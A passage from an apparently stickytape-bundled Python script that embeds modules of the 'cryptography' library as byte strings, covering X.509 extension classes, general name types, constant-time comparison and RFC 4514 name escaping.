typing.Type[OtherName],\r\n            typing.Type[RFC822Name],\r\n            typing.Type[RegisteredID],\r\n            typing.Type[UniformResourceIdentifier],\r\n        ],\r\n    ) -> typing.Union[\r\n        typing.List[_IPADDRESS_TYPES],\r\n        typing.List[str],\r\n        typing.List[OtherName],\r\n        typing.List[Name],\r\n        typing.List[ObjectIdentifier],\r\n    ]:\r\n        return self._general_names.get_values_for_type(type)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<SubjectAlternativeName({})>".format(self._general_names)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, SubjectAlternativeName):\r\n            return NotImplemented\r\n\r\n        return self._general_names == other._general_names\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self._general_names)\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass IssuerAlternativeName(ExtensionType):\r\n    oid = ExtensionOID.ISSUER_ALTERNATIVE_NAME\r\n\r\n    def __init__(self, general_names: typing.Iterable[GeneralName]) -> None:\r\n        self._general_names = GeneralNames(general_names)\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_general_names")\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Union[\r\n            typing.Type[DNSName],\r\n            typing.Type[UniformResourceIdentifier],\r\n            typing.Type[RFC822Name],\r\n        ],\r\n    ) -> typing.List[str]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Type[DirectoryName],\r\n    ) -> typing.List[Name]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Type[RegisteredID],\r\n    ) -> typing.List[ObjectIdentifier]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self, type: typing.Type[IPAddress]\r\n    ) -> typing.List[_IPADDRESS_TYPES]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self, type: typing.Type[OtherName]\r\n    ) -> typing.List[OtherName]:\r\n        ...\r\n\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Union[\r\n            typing.Type[DNSName],\r\n            typing.Type[DirectoryName],\r\n            typing.Type[IPAddress],\r\n            typing.Type[OtherName],\r\n            typing.Type[RFC822Name],\r\n            typing.Type[RegisteredID],\r\n            typing.Type[UniformResourceIdentifier],\r\n        ],\r\n    ) -> typing.Union[\r\n        typing.List[_IPADDRESS_TYPES],\r\n        typing.List[str],\r\n        typing.List[OtherName],\r\n        typing.List[Name],\r\n        typing.List[ObjectIdentifier],\r\n    ]:\r\n        return self._general_names.get_values_for_type(type)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<IssuerAlternativeName({})>".format(self._general_names)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, IssuerAlternativeName):\r\n            return NotImplemented\r\n\r\n        return self._general_names == other._general_names\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self._general_names)\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass CertificateIssuer(ExtensionType):\r\n    oid = CRLEntryExtensionOID.CERTIFICATE_ISSUER\r\n\r\n    def __init__(self, general_names: typing.Iterable[GeneralName]) -> None:\r\n        self._general_names = GeneralNames(general_names)\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods("_general_names")\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Union[\r\n            typing.Type[DNSName],\r\n            typing.Type[UniformResourceIdentifier],\r\n            typing.Type[RFC822Name],\r\n        ],\r\n    ) -> typing.List[str]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Type[DirectoryName],\r\n    ) -> typing.List[Name]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Type[RegisteredID],\r\n    ) -> typing.List[ObjectIdentifier]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self, type: typing.Type[IPAddress]\r\n    ) -> typing.List[_IPADDRESS_TYPES]:\r\n        ...\r\n\r\n    @typing.overload\r\n    def get_values_for_type(\r\n        self, type: typing.Type[OtherName]\r\n    ) -> typing.List[OtherName]:\r\n        ...\r\n\r\n    def get_values_for_type(\r\n        self,\r\n        type: typing.Union[\r\n            typing.Type[DNSName],\r\n            typing.Type[DirectoryName],\r\n            typing.Type[IPAddress],\r\n            typing.Type[OtherName],\r\n            typing.Type[RFC822Name],\r\n            typing.Type[RegisteredID],\r\n            typing.Type[UniformResourceIdentifier],\r\n        ],\r\n    ) -> typing.Union[\r\n        typing.List[_IPADDRESS_TYPES],\r\n        typing.List[str],\r\n        typing.List[OtherName],\r\n        typing.List[Name],\r\n        typing.List[ObjectIdentifier],\r\n    ]:\r\n        return self._general_names.get_values_for_type(type)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<CertificateIssuer({})>".format(self._general_names)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, CertificateIssuer):\r\n            return NotImplemented\r\n\r\n        return self._general_names == other._general_names\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self._general_names)\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass CRLReason(ExtensionType):\r\n    oid = CRLEntryExtensionOID.CRL_REASON\r\n\r\n    def __init__(self, reason: ReasonFlags) -> None:\r\n        if not isinstance(reason, ReasonFlags):\r\n            raise TypeError("reason must be an element from ReasonFlags")\r\n\r\n        self._reason = reason\r\n\r\n    def __repr__(self) -> str:\r\n        return "<CRLReason(reason={})>".format(self._reason)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, CRLReason):\r\n            return NotImplemented\r\n\r\n        return self.reason == other.reason\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.reason)\r\n\r\n    @property\r\n    def reason(self) -> ReasonFlags:\r\n        return self._reason\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass InvalidityDate(ExtensionType):\r\n    oid = CRLEntryExtensionOID.INVALIDITY_DATE\r\n\r\n    def __init__(self, invalidity_date: datetime.datetime) -> None:\r\n        if not isinstance(invalidity_date, datetime.datetime):\r\n            raise TypeError("invalidity_date must be a datetime.datetime")\r\n\r\n        self._invalidity_date = invalidity_date\r\n\r\n    def __repr__(self) -> str:\r\n        return "<InvalidityDate(invalidity_date={})>".format(\r\n            self._invalidity_date\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, InvalidityDate):\r\n            return NotImplemented\r\n\r\n        return self.invalidity_date == other.invalidity_date\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.invalidity_date)\r\n\r\n    @property\r\n    def invalidity_date(self) -> datetime.datetime:\r\n        return self._invalidity_date\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass PrecertificateSignedCertificateTimestamps(ExtensionType):\r\n    oid = ExtensionOID.PRECERT_SIGNED_CERTIFICATE_TIMESTAMPS\r\n\r\n    def __init__(\r\n        self,\r\n        signed_certificate_timestamps: typing.Iterable[\r\n            SignedCertificateTimestamp\r\n        ],\r\n    ) -> None:\r\n        signed_certificate_timestamps = list(signed_certificate_timestamps)\r\n        if not all(\r\n            isinstance(sct, SignedCertificateTimestamp)\r\n            for sct in signed_certificate_timestamps\r\n        ):\r\n            raise TypeError(\r\n                "Every item in the signed_certificate_timestamps list must be "\r\n                "a SignedCertificateTimestamp"\r\n            )\r\n        self._signed_certificate_timestamps = signed_certificate_timestamps\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods(\r\n        "_signed_certificate_timestamps"\r\n    )\r\n\r\n    def __repr__(self) -> str:\r\n        return "<PrecertificateSignedCertificateTimestamps({})>".format(\r\n            list(self)\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._signed_certificate_timestamps))\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, PrecertificateSignedCertificateTimestamps):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self._signed_certificate_timestamps\r\n            == other._signed_certificate_timestamps\r\n        )\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass SignedCertificateTimestamps(ExtensionType):\r\n    oid = ExtensionOID.SIGNED_CERTIFICATE_TIMESTAMPS\r\n\r\n    def __init__(\r\n        self,\r\n        signed_certificate_timestamps: typing.Iterable[\r\n            SignedCertificateTimestamp\r\n        ],\r\n    ) -> None:\r\n        signed_certificate_timestamps = list(signed_certificate_timestamps)\r\n        if not all(\r\n            isinstance(sct, SignedCertificateTimestamp)\r\n            for sct in signed_certificate_timestamps\r\n        ):\r\n            raise TypeError(\r\n                "Every item in the signed_certificate_timestamps list must be "\r\n                "a SignedCertificateTimestamp"\r\n            )\r\n        self._signed_certificate_timestamps = signed_certificate_timestamps\r\n\r\n    __len__, __iter__, __getitem__ = _make_sequence_methods(\r\n        "_signed_certificate_timestamps"\r\n    )\r\n\r\n    def __repr__(self) -> str:\r\n        return "<SignedCertificateTimestamps({})>".format(list(self))\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(tuple(self._signed_certificate_timestamps))\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, SignedCertificateTimestamps):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self._signed_certificate_timestamps\r\n            == other._signed_certificate_timestamps\r\n        )\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass OCSPNonce(ExtensionType):\r\n    oid = OCSPExtensionOID.NONCE\r\n\r\n    def __init__(self, nonce: bytes) -> None:\r\n        if not isinstance(nonce, bytes):\r\n            raise TypeError("nonce must be bytes")\r\n\r\n        self._nonce = nonce\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, OCSPNonce):\r\n            return NotImplemented\r\n\r\n        return self.nonce == other.nonce\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.nonce)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<OCSPNonce(nonce={0.nonce!r})>".format(self)\r\n\r\n    @property\r\n    def nonce(self) -> bytes:\r\n        return self._nonce\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass IssuingDistributionPoint(ExtensionType):\r\n    oid = ExtensionOID.ISSUING_DISTRIBUTION_POINT\r\n\r\n    def __init__(\r\n        self,\r\n        full_name: typing.Optional[typing.Iterable[GeneralName]],\r\n        relative_name: typing.Optional[RelativeDistinguishedName],\r\n        only_contains_user_certs: bool,\r\n        only_contains_ca_certs: bool,\r\n        only_some_reasons: typing.Optional[typing.FrozenSet[ReasonFlags]],\r\n        indirect_crl: bool,\r\n        only_contains_attribute_certs: bool,\r\n    ) -> None:\r\n        if full_name is not None:\r\n            full_name = list(full_name)\r\n\r\n        if only_some_reasons and (\r\n            not isinstance(only_some_reasons, frozenset)\r\n            or not all(isinstance(x, ReasonFlags) for x in only_some_reasons)\r\n        ):\r\n            raise TypeError(\r\n                "only_some_reasons must be None or frozenset of ReasonFlags"\r\n            )\r\n\r\n        if only_some_reasons and (\r\n            ReasonFlags.unspecified in only_some_reasons\r\n            or ReasonFlags.remove_from_crl in only_some_reasons\r\n        ):\r\n            raise ValueError(\r\n                "unspecified and remove_from_crl are not valid reasons in an "\r\n                "IssuingDistributionPoint"\r\n            )\r\n\r\n        if not (\r\n            isinstance(only_contains_user_certs, bool)\r\n            and isinstance(only_contains_ca_certs, bool)\r\n            and isinstance(indirect_crl, bool)\r\n            and isinstance(only_contains_attribute_certs, bool)\r\n        ):\r\n            raise TypeError(\r\n                "only_contains_user_certs, only_contains_ca_certs, "\r\n                "indirect_crl and only_contains_attribute_certs "\r\n                "must all be boolean."\r\n            )\r\n\r\n        crl_constraints = [\r\n            only_contains_user_certs,\r\n            only_contains_ca_certs,\r\n            indirect_crl,\r\n            only_contains_attribute_certs,\r\n        ]\r\n\r\n        if len([x for x in crl_constraints if x]) > 1:\r\n            raise ValueError(\r\n                "Only one of the following can be set to True: "\r\n                "only_contains_user_certs, only_contains_ca_certs, "\r\n                "indirect_crl, only_contains_attribute_certs"\r\n            )\r\n\r\n        if not any(\r\n            [\r\n                only_contains_user_certs,\r\n                only_contains_ca_certs,\r\n                indirect_crl,\r\n                only_contains_attribute_certs,\r\n                full_name,\r\n                relative_name,\r\n                only_some_reasons,\r\n            ]\r\n        ):\r\n            raise ValueError(\r\n                "Cannot create empty extension: "\r\n                "if only_contains_user_certs, only_contains_ca_certs, "\r\n                "indirect_crl, and only_contains_attribute_certs are all False"\r\n                ", then either full_name, relative_name, or only_some_reasons "\r\n                "must have a value."\r\n            )\r\n\r\n        self._only_contains_user_certs = only_contains_user_certs\r\n        self._only_contains_ca_certs = only_contains_ca_certs\r\n        self._indirect_crl = indirect_crl\r\n        self._only_contains_attribute_certs = only_contains_attribute_certs\r\n        self._only_some_reasons = only_some_reasons\r\n        self._full_name = full_name\r\n        self._relative_name = relative_name\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<IssuingDistributionPoint(full_name={0.full_name}, "\r\n            "relative_name={0.relative_name}, "\r\n            "only_contains_user_certs={0.only_contains_user_certs}, "\r\n            "only_contains_ca_certs={0.only_contains_ca_certs}, "\r\n            "only_some_reasons={0.only_some_reasons}, "\r\n            "indirect_crl={0.indirect_crl}, "\r\n            "only_contains_attribute_certs="\r\n            "{0.only_contains_attribute_certs})>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, IssuingDistributionPoint):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.full_name == other.full_name\r\n            and self.relative_name == other.relative_name\r\n            and self.only_contains_user_certs == other.only_contains_user_certs\r\n            and self.only_contains_ca_certs == other.only_contains_ca_certs\r\n            and self.only_some_reasons == other.only_some_reasons\r\n            and self.indirect_crl == other.indirect_crl\r\n            and self.only_contains_attribute_certs\r\n            == other.only_contains_attribute_certs\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(\r\n            (\r\n                self.full_name,\r\n                self.relative_name,\r\n                self.only_contains_user_certs,\r\n                self.only_contains_ca_certs,\r\n                self.only_some_reasons,\r\n                self.indirect_crl,\r\n                self.only_contains_attribute_certs,\r\n            )\r\n        )\r\n\r\n    @property\r\n    def full_name(self) -> typing.Optional[typing.List[GeneralName]]:\r\n        return self._full_name\r\n\r\n    @property\r\n    def relative_name(self) -> typing.Optional[RelativeDistinguishedName]:\r\n        return self._relative_name\r\n\r\n    @property\r\n    def only_contains_user_certs(self) -> bool:\r\n        return self._only_contains_user_certs\r\n\r\n    @property\r\n    def only_contains_ca_certs(self) -> bool:\r\n        return self._only_contains_ca_certs\r\n\r\n    @property\r\n    def only_some_reasons(\r\n        self,\r\n    ) -> typing.Optional[typing.FrozenSet[ReasonFlags]]:\r\n        return self._only_some_reasons\r\n\r\n    @property\r\n    def indirect_crl(self) -> bool:\r\n        return self._indirect_crl\r\n\r\n    @property\r\n    def only_contains_attribute_certs(self) -> bool:\r\n        return self._only_contains_attribute_certs\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return rust_x509.encode_extension_value(self)\r\n\r\n\r\nclass UnrecognizedExtension(ExtensionType):\r\n    def __init__(self, oid: ObjectIdentifier, value: bytes) -> None:\r\n        if not isinstance(oid, ObjectIdentifier):\r\n            raise TypeError("oid must be an ObjectIdentifier")\r\n        self._oid = oid\r\n        self._value = value\r\n\r\n    @property\r\n    def oid(self) -> ObjectIdentifier:  # type: ignore[override]\r\n        return self._oid\r\n\r\n    @property\r\n    def value(self) -> bytes:\r\n        return self._value\r\n\r\n    def __repr__(self) -> str:\r\n        return (\r\n            "<UnrecognizedExtension(oid={0.oid}, "\r\n            "value={0.value!r})>".format(self)\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, UnrecognizedExtension):\r\n            return NotImplemented\r\n\r\n        return self.oid == other.oid and self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.oid, self.value))\r\n\r\n    def public_bytes(self) -> bytes:\r\n        return self.value\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/constant_time.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport hmac\r\n\r\n\r\ndef bytes_eq(a: bytes, b: bytes) -> bool:\r\n    if not isinstance(a, bytes) or not isinstance(b, bytes):\r\n        raise TypeError("a and b must be bytes.")\r\n\r\n    return hmac.compare_digest(a, b)\r\n')
    __stickytape_write_module('cryptography/x509/general_name.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport ipaddress\r\nimport typing\r\nfrom email.utils import parseaddr\r\n\r\nfrom cryptography.x509.name import Name\r\nfrom cryptography.x509.oid import ObjectIdentifier\r\n\r\n\r\n_IPADDRESS_TYPES = typing.Union[\r\n    ipaddress.IPv4Address,\r\n    ipaddress.IPv6Address,\r\n    ipaddress.IPv4Network,\r\n    ipaddress.IPv6Network,\r\n]\r\n\r\n\r\nclass UnsupportedGeneralNameType(Exception):\r\n    pass\r\n\r\n\r\nclass GeneralName(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def value(self) -> typing.Any:\r\n        """\r\n        Return the value of the object\r\n        """\r\n\r\n\r\nclass RFC822Name(GeneralName):\r\n    def __init__(self, value: str) -> None:\r\n        if isinstance(value, str):\r\n            try:\r\n                value.encode("ascii")\r\n            except UnicodeEncodeError:\r\n                raise ValueError(\r\n                    "RFC822Name values should be passed as an A-label string. "\r\n                    "This means unicode characters should be encoded via "\r\n                    "a library like idna."\r\n                )\r\n        else:\r\n            raise TypeError("value must be string")\r\n\r\n        name, address = parseaddr(value)\r\n        if name or not address:\r\n            # parseaddr has found a name (e.g. Name <email>) or the entire\r\n            # value is an empty string.\r\n            raise ValueError("Invalid rfc822name value")\r\n\r\n        self._value = value\r\n\r\n    @property\r\n    def value(self) -> str:\r\n        return self._value\r\n\r\n    @classmethod\r\n    def _init_without_validation(cls, value: str) -> "RFC822Name":\r\n        instance = cls.__new__(cls)\r\n        instance._value = value\r\n        return instance\r\n\r\n    def __repr__(self) -> str:\r\n        return "<RFC822Name(value={0!r})>".format(self.value)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, RFC822Name):\r\n            return NotImplemented\r\n\r\n        return self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.value)\r\n\r\n\r\nclass DNSName(GeneralName):\r\n    def __init__(self, value: str) -> None:\r\n        if isinstance(value, str):\r\n            try:\r\n                value.encode("ascii")\r\n            except UnicodeEncodeError:\r\n                raise ValueError(\r\n                    "DNSName values should be passed as an A-label string. "\r\n                    "This means unicode characters should be encoded via "\r\n                    "a library like idna."\r\n                )\r\n        else:\r\n            raise TypeError("value must be string")\r\n\r\n        self._value = value\r\n\r\n    @property\r\n    def value(self) -> str:\r\n        return self._value\r\n\r\n    @classmethod\r\n    def _init_without_validation(cls, value: str) -> "DNSName":\r\n        instance = cls.__new__(cls)\r\n        instance._value = value\r\n        return instance\r\n\r\n    def __repr__(self) -> str:\r\n        return "<DNSName(value={0!r})>".format(self.value)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DNSName):\r\n            return NotImplemented\r\n\r\n        return self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.value)\r\n\r\n\r\nclass UniformResourceIdentifier(GeneralName):\r\n    def __init__(self, value: str) -> None:\r\n        if isinstance(value, str):\r\n            try:\r\n                value.encode("ascii")\r\n            except UnicodeEncodeError:\r\n                raise ValueError(\r\n                    "URI values should be passed as an A-label string. "\r\n                    "This means unicode characters should be encoded via "\r\n                    "a library like idna."\r\n                )\r\n        else:\r\n            raise TypeError("value must be string")\r\n\r\n        self._value = value\r\n\r\n    @property\r\n    def value(self) -> str:\r\n        return self._value\r\n\r\n    @classmethod\r\n    def _init_without_validation(\r\n        cls, value: str\r\n    ) -> "UniformResourceIdentifier":\r\n        instance = cls.__new__(cls)\r\n        instance._value = value\r\n        return instance\r\n\r\n    def __repr__(self) -> str:\r\n        return "<UniformResourceIdentifier(value={0!r})>".format(self.value)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, UniformResourceIdentifier):\r\n            return NotImplemented\r\n\r\n        return self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.value)\r\n\r\n\r\nclass DirectoryName(GeneralName):\r\n    def __init__(self, value: Name) -> None:\r\n        if not isinstance(value, Name):\r\n            raise TypeError("value must be a Name")\r\n\r\n        self._value = value\r\n\r\n    @property\r\n    def value(self) -> Name:\r\n        return self._value\r\n\r\n    def __repr__(self) -> str:\r\n        return "<DirectoryName(value={})>".format(self.value)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, DirectoryName):\r\n            return NotImplemented\r\n\r\n        return self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.value)\r\n\r\n\r\nclass RegisteredID(GeneralName):\r\n    def __init__(self, value: ObjectIdentifier) -> None:\r\n        if not isinstance(value, ObjectIdentifier):\r\n            raise TypeError("value must be an ObjectIdentifier")\r\n\r\n        self._value = value\r\n\r\n    @property\r\n    def value(self) -> ObjectIdentifier:\r\n        return self._value\r\n\r\n    def __repr__(self) -> str:\r\n        return "<RegisteredID(value={})>".format(self.value)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, RegisteredID):\r\n            return NotImplemented\r\n\r\n        return self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.value)\r\n\r\n\r\nclass IPAddress(GeneralName):\r\n    def __init__(self, value: _IPADDRESS_TYPES) -> None:\r\n        if not isinstance(\r\n            value,\r\n            (\r\n                ipaddress.IPv4Address,\r\n                ipaddress.IPv6Address,\r\n                ipaddress.IPv4Network,\r\n                ipaddress.IPv6Network,\r\n            ),\r\n        ):\r\n            raise TypeError(\r\n                "value must be an instance of ipaddress.IPv4Address, "\r\n                "ipaddress.IPv6Address, ipaddress.IPv4Network, or "\r\n                "ipaddress.IPv6Network"\r\n            )\r\n\r\n        self._value = value\r\n\r\n    @property\r\n    def value(self) -> _IPADDRESS_TYPES:\r\n        return self._value\r\n\r\n    def _packed(self) -> bytes:\r\n        if isinstance(\r\n            self.value, (ipaddress.IPv4Address, ipaddress.IPv6Address)\r\n        ):\r\n            return self.value.packed\r\n        else:\r\n            return (\r\n                self.value.network_address.packed + self.value.netmask.packed\r\n            )\r\n\r\n    def __repr__(self) -> str:\r\n        return "<IPAddress(value={})>".format(self.value)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, IPAddress):\r\n            return NotImplemented\r\n\r\n        return self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.value)\r\n\r\n\r\nclass OtherName(GeneralName):\r\n    def __init__(self, type_id: ObjectIdentifier, value: bytes) -> None:\r\n        if not isinstance(type_id, ObjectIdentifier):\r\n            raise TypeError("type_id must be an ObjectIdentifier")\r\n        if not isinstance(value, bytes):\r\n            raise TypeError("value must be a binary string")\r\n\r\n        self._type_id = type_id\r\n        self._value = value\r\n\r\n    @property\r\n    def type_id(self) -> ObjectIdentifier:\r\n        return self._type_id\r\n\r\n    @property\r\n    def value(self) -> bytes:\r\n        return self._value\r\n\r\n    def __repr__(self) -> str:\r\n        return "<OtherName(type_id={}, value={!r})>".format(\r\n            self.type_id, self.value\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, OtherName):\r\n            return NotImplemented\r\n\r\n        return self.type_id == other.type_id and self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.type_id, self.value))\r\n')
    __stickytape_write_module('cryptography/x509/name.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport binascii\r\nimport re\r\nimport sys\r\nimport typing\r\nimport warnings\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.hazmat.bindings._rust import (\r\n    x509 as rust_x509,\r\n)\r\nfrom cryptography.x509.oid import NameOID, ObjectIdentifier\r\n\r\n\r\nclass _ASN1Type(utils.Enum):\r\n    BitString = 3\r\n    OctetString = 4\r\n    UTF8String = 12\r\n    NumericString = 18\r\n    PrintableString = 19\r\n    T61String = 20\r\n    IA5String = 22\r\n    UTCTime = 23\r\n    GeneralizedTime = 24\r\n    VisibleString = 26\r\n    UniversalString = 28\r\n    BMPString = 30\r\n\r\n\r\n_ASN1_TYPE_TO_ENUM = {i.value: i for i in _ASN1Type}\r\n_NAMEOID_DEFAULT_TYPE: typing.Dict[ObjectIdentifier, _ASN1Type] = {\r\n    NameOID.COUNTRY_NAME: _ASN1Type.PrintableString,\r\n    NameOID.JURISDICTION_COUNTRY_NAME: _ASN1Type.PrintableString,\r\n    NameOID.SERIAL_NUMBER: _ASN1Type.PrintableString,\r\n    NameOID.DN_QUALIFIER: _ASN1Type.PrintableString,\r\n    NameOID.EMAIL_ADDRESS: _ASN1Type.IA5String,\r\n    NameOID.DOMAIN_COMPONENT: _ASN1Type.IA5String,\r\n}\r\n\r\n# Type alias\r\n_OidNameMap = typing.Mapping[ObjectIdentifier, str]\r\n\r\n#: Short attribute names from RFC 4514:\r\n#: https://tools.ietf.org/html/rfc4514#page-7\r\n_NAMEOID_TO_NAME: _OidNameMap = {\r\n    NameOID.COMMON_NAME: "CN",\r\n    NameOID.LOCALITY_NAME: "L",\r\n    NameOID.STATE_OR_PROVINCE_NAME: "ST",\r\n    NameOID.ORGANIZATION_NAME: "O",\r\n    NameOID.ORGANIZATIONAL_UNIT_NAME: "OU",\r\n    NameOID.COUNTRY_NAME: "C",\r\n    NameOID.STREET_ADDRESS: "STREET",\r\n    NameOID.DOMAIN_COMPONENT: "DC",\r\n    NameOID.USER_ID: "UID",\r\n}\r\n_NAME_TO_NAMEOID = {v: k for k, v in _NAMEOID_TO_NAME.items()}\r\n\r\n\r\ndef _escape_dn_value(val: typing.Union[str, bytes]) -> str:\r\n    """Escape special characters in RFC4514 Distinguished Name value."""\r\n\r\n    if not val:\r\n        return ""\r\n\r\n    # RFC 4514 Section 2.4 defines the value as being the # (U+0023) character\r\n    # followed by the hexadecimal encoding of the octets.\r\n    if isinstance(val, bytes):\r\n        return "#" + binascii.hexlify(val).decode("utf8")\r\n\r\n    # See https://tools.ietf.org/html/rfc4514#section-2.4\r\n    val = val.replace("\\\\", "\\\\\\\\")\r\n    val = val.replace(\'"\', \'\\\\"\')\r\n    val = val.replace("+", "\\\\+")\r\n    val = val.replace(",", "\\\\,")\r\n    val = val.replace(";", "\\\\;")\r\n    val = val.replace("<", "\\\\<")\r\n    val = val.replace(">", "\\\\>")\r\n    val = val.replace("\\0", "\\\\00")\r\n\r\n    if val[0] in ("#", " "):\r\n        val = "\\\\" + val\r\n    if val[-1] == " ":\r\n        val = val[:-1] + "\\\\ "\r\n\r\n    return val\r\n\r\n\r\ndef _unescape_dn_value(val: str) -> str:\r\n    if not val:\r\n        return ""\r\n\r\n    # See https://tools.ietf.org/html/rfc4514#section-3\r\n\r\n    # special = escaped / SPACE / SHARP / EQUALS\r\n    # escaped = DQUOTE / PLUS / COMMA / SEMI / LANGLE / RANGLE\r\n    def sub(m):\r\n        val = m.group(1)\r\n        # Regular escape\r\n        if len(val) == 1:\r\n            return val\r\n        # Hex-value scape\r\n        return chr(int(val, 16))\r\n\r\n    return _RFC4514NameParser._PAIR_RE.sub(sub, val)\r\n\r\n\r\nclass NameAttribute:\r\n    def __init__(\r\n        self,\r\n        oid: ObjectIdentifier,\r\n        value: typing.Union[str, bytes],\r\n        _type: typing.Optional[_ASN1Type] = None,\r\n        *,\r\n        _validate: bool = True,\r\n    ) -> None:\r\n        if not isinstance(oid, ObjectIdentifier):\r\n            raise TypeError(\r\n                "oid argument must be an ObjectIdentifier instance."\r\n            )\r\n        if _type == _ASN1Type.BitString:\r\n            if oid != NameOID.X500_UNIQUE_IDENTIFIER:\r\n                raise TypeError(\r\n                    "oid must be X500_UNIQUE_IDENTIFIER for BitString type."\r\n                )\r\n            if not isinstance(value, bytes):\r\n                raise TypeError("value must be bytes for BitString")\r\n        else:\r\n            if not isinstance(value, str):\r\n                raise TypeError("value argument must be a str")\r\n\r\n        if (\r\n            oid == NameOID.COUNTRY_NAME\r\n            or oid == NameOID.JURISDICTION_COUNTRY_NAME\r\n        ):\r\n            assert isinstance(value, str)\r\n            c_len = len(value.encode("utf8"))\r\n            if c_len != 2 and _validate is True:\r\n                raise ValueError(\r\n                    "Country name must be a 2 character country code"\r\n                )\r\n            elif c_len != 2:\r\n                warnings.warn(\r\n                    "Country names should be two characters, but the "\r\n                    "attribute is {} characters in length.".format(c_len),\r\n                    stacklevel=2,\r\n                )\r\n\r\n        # The appropriate ASN1 string type varies by OID and is defined across\r\n        # multiple RFCs including 2459, 3280, and 5280. In general UTF8String\r\n        # is preferred (2459), but 3280 and 5280 specify several OIDs with\r\n        # alternate types. This means when we see the sentinel value we need\r\n        # to look up whether the OID has a 